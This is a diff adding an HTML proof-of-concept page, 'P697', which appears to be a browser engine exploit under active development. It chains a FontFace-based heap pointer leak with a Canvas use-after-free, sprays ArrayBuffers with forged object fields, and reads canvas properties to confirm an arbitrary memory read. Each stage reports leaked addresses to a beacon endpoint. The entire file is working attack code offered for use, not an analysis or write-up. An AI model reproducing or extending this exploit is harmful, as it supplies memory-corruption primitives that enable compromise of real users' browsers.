@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P697 — proven-leak timing + same-load AB forge</title>
+<script>
+'use strict';
+/* ============================================================
+ * P697 — FontFace leak (PROVEN timing) then same-load AB forge
+ *
+ * History:
+ *  - P693v1 / P694 got A-HIT (p58=0x10008b5c30 etc) with a SINGLE
+ *    setTimeout(...,200) scan and no competing allocations.
+ *  - P696 polled every 40ms x12 and got A-MISS tries=12 (zero
+ *    nonzero bytes in all 48 buffers). The interval churn +
+ *    document.fonts.check() allocations disturbed the window.
+ *
+ * So: restore the exact proven leak shape (single 200ms scan),
+ * then continue INTO the Canvas UAF + AB-only forge in the same
+ * load, using setImmediate-ish ordering that does not allocate
+ * during the leak window.
+ *
+ * Decisive read: innerCtx2.lineWidth
+ *   0x4094E40000000000 (1337.0) -> same-type alias returned (bad)
+ *   0x00000010xxxxxxxx          -> mem[p58] read: ARBITRARY READ
+ *   throw / crash               -> cross-type AB reclaim blocked
+ * ============================================================ */
+
+function b(tag,data){try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P697-'+encodeURIComponent(tag)+
+    '&data='+encodeURIComponent(String(data||'').slice(0,900))+'&t='+Date.now(),true);
+  x.send(null);}catch(e){}}
+function ba(tag,data){try{new Image().src='/beacon.php?tag=P697-'+encodeURIComponent(tag)+
+  '&data='+encodeURIComponent(String(data||'').slice(0,300))+'&t='+Date.now();}catch(e){}}
+function hex(v){return '0x'+BigInt(v).toString(16)}
+function f64bits(v){var bb=new ArrayBuffer(8);new Float64Array(bb)[0]=v;
+  return new BigUint64Array(bb)[0]}
+
+var P58=null,P68=null;
+
+function run(){
+  b('BOOT','p697');
+  try{ stageALeak(); }catch(e){ b('BOOT-ERR',(e.message||String(e)).slice(0,120)); }
+}
+
+/* ---------- PHASE A: FontFace leak, proven single-scan shape ---------- */
+function stageALeak(){
+  b('A-GO');
+  var styleEl=document.createElement('style');
+  styleEl.textContent='@font-face{font-family:s0;src:local(Arial);unicode-range:U+0042;}';
+  document.head.appendChild(styleEl);
+  var face=new FontFace('f0','local(Helvetica)',{unicodeRange:'U+0041'});
+  document.fonts.add(face); void face.loaded;
+
+  var ffAbs=[], ffFired=false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){
+      if(ffFired) return undefined; ffFired=true;
+      if(styleEl){styleEl.remove(); styleEl.textContent=''; styleEl=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      for(var k=0;k<48;k++) ffAbs.push(new ArrayBuffer(192));
+      try{document.fonts.check('1em s0');}catch(e){}
+      return undefined;
+    }, set:function(){}});
+
+  document.fonts.load('1em f0, s0','AB');
+
+  /* EXACT proven shape: one scan at 200ms, nothing else allocating */
+  setTimeout(function(){
+    var bestK=-1,bestNz=0;
+    for(var k=0;k<ffAbs.length;k++){
+      var u=new Uint8Array(ffAbs[k]),nz=0;
+      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
+      if(nz>bestNz){bestNz=nz;bestK=k;}
+    }
+    if(bestK<0||bestNz===0){
+      b('A-MISS','no-hit');
+      setTimeout(function(){ location.reload(); }, 300);
+      return;
+    }
+    var bv=new BigUint64Array(ffAbs[bestK]);
+    P58=bv[11]; P68=bv[13];
+    b('A-HIT','p58='+hex(P58)+'|p68='+hex(P68)+'|k='+bestK+'|nz='+bestNz);
+    try{document.cookie='p697_p58='+P58.toString()+';path=/;max-age=86400';}catch(e){}
+    try{sessionStorage.setItem('p697_p58',P58.toString());}catch(e){}
+    /* same load: go straight to the forge */
+    setTimeout(stageB, 30);
+  }, 200);
+}
+
+/* ---------- PHASE B: Canvas UAF, AB-only forge, read ---------- */
+function stageB(){
+  b('B-GO','p58='+hex(P58));
+  var innerCtx2=null;
+  var canvas2=document.createElement('canvas'); canvas2.width=1; canvas2.height=1;
+  var o={};
+  Object.defineProperty(o,'alpha',{get:function(){ innerCtx2=canvas2.getContext('2d'); return true; }});
+  canvas2.getContext('bitmaprenderer', o);
+  if(!innerCtx2){ b('B-FAIL','no-ctx'); ba('DONE','b-fail'); return; }
+  b('B-UAF','ok');
+
+  /* ---- AB(768) ONLY. Deliberately NO canvas context spray. ---- */
+  var abs=[];
+  for(var ai=0;ai<500;ai++) abs.push(new ArrayBuffer(768));
+  b('B-SPRAY','500-AB-only');
+
+  var TARGET=P58-BigInt(48);
+  for(var fi=0;fi<abs.length;fi++){
+    var bv=new BigUint64Array(abs[fi]);
+    var u32=new Uint32Array(abs[fi]);
+    bv[14]=TARGET;   /* +112 m_stateStack.m_buffer */
+    u32[30]=1;       /* +120 m_capacity */
+    u32[31]=1;       /* +124 m_size */
+  }
+  b('B-FORGED','target='+hex(TARGET));
+
+  var lw=null,err=null;
+  try{ lw=innerCtx2.lineWidth; }catch(e){ err=(e.message||String(e)); }
+  if(err!==null){ b('B-READ-ERR',err.slice(0,160)); ba('DONE','read-err'); return; }
+
+  var bits=f64bits(lw);
+  var isNonZero=(bits!==BigInt(0));
+  var is1337=(bits===BigInt('0x4094e40000000000'));
+  var looksHeap=(bits>=BigInt('0x1000000000')&&bits<BigInt('0x8000000000'));
+  b('B-READ','lw='+lw+'|bits='+hex(bits));
+  b('B-VERDICT','nonzero='+isNonZero+'|is1337='+is1337+'|heapShaped='+looksHeap);
+
+  try{ var ga=innerCtx2.globalAlpha; b('B-GA','ga='+ga+'|bits='+hex(f64bits(ga))); }catch(e){ b('B-GA-ERR',(e.message||'').slice(0,80)); }
+  try{ var ml=innerCtx2.miterLimit; b('B-ML','ml='+ml+'|bits='+hex(f64bits(ml))); }catch(e){ b('B-ML-ERR',(e.message||'').slice(0,80)); }
+
+  if(P68 && P68>BigInt(48)){
+    var T2=P68-BigInt(48);
+    for(var fi2=0;fi2<abs.length;fi2++) new BigUint64Array(abs[fi2])[14]=T2;
+    try{ var lw2=innerCtx2.lineWidth;
+      b('B-2ND','target='+hex(T2)+'|lw='+lw2+'|bits='+hex(f64bits(lw2))); }
+    catch(e){ b('B-2ND-ERR',(e.message||'').slice(0,80)); }
+  }
+
+  if(looksHeap) b('RESULT','ARBITRARY-READ-CONFIRMED');
+  else if(is1337) b('RESULT','SAME-TYPE-ALIAS');
+  else b('RESULT','OTHER');
+  ba('DONE','nonzero='+isNonZero+'|is1337='+is1337+'|heapShaped='+looksHeap+'|bits='+hex(bits));
+}
+
+if(document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
+else document.addEventListener('DOMContentLoaded',run);
+</script>
+</head><body><pre id="out">P697 — proven leak timing + same-load AB forge</pre></body></html>
